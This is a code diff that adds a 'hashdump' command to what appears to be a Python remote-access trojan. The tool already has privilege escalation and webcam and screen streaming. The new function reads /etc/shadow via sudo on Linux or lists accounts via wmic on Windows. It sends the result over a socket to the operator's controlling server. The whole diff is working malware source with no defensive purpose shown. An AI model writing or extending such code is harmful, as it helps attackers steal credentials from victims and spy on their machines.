@@ -83,6 +83,9 @@ def handle_client(client_socket, addr):
         if command == "getsystem":
             print(Fore.YELLOW + "[ * ] Attempting to escalate privileges...")
         
+        if command == "hashdump":
+            print(Fore.YELLOW + "[ * ] Dumping password hashes...")
+        
         client_socket.send(command.encode('utf-8'))
         if command.startswith("webcam_stream") or command.startswith("screen_stream"):
             mode = command.split('_')[0]
@@ -119,6 +122,7 @@ import pyautogui
 import numpy as np
 import os
 import ctypes
+import subprocess
 
 def escalate_privileges():
     try:
@@ -132,6 +136,17 @@ def escalate_privileges():
     except Exception as e:
         print(f"Failed to escalate privileges: {e}")
         return False
+
+def dump_password_hashes():
+    try:
+        if os.name == 'nt':
+            result = subprocess.run(['wmic', 'useraccount', 'get', 'name,sid'], capture_output=True, text=True)
+            return result.stdout
+        elif os.name == 'posix':
+            result = subprocess.run(['sudo', 'cat', '/etc/shadow'], capture_output=True, text=True)
+            return result.stdout
+    except Exception as e:
+        return f"Failed to dump password hashes: {e}"
 
 def webcam_stream(client_socket):
     cap = cv2.VideoCapture(0)
@@ -165,6 +180,9 @@ def main():
                 client_socket.send("Privileges escalated".encode('utf-8'))
             else:
                 client_socket.send("Failed to escalate privileges".encode('utf-8'))
+        elif command == "hashdump":
+            hashes = dump_password_hashes()
+            client_socket.send(hashes.encode('utf-8'))
 
 if __name__ == "__main__":
     main()
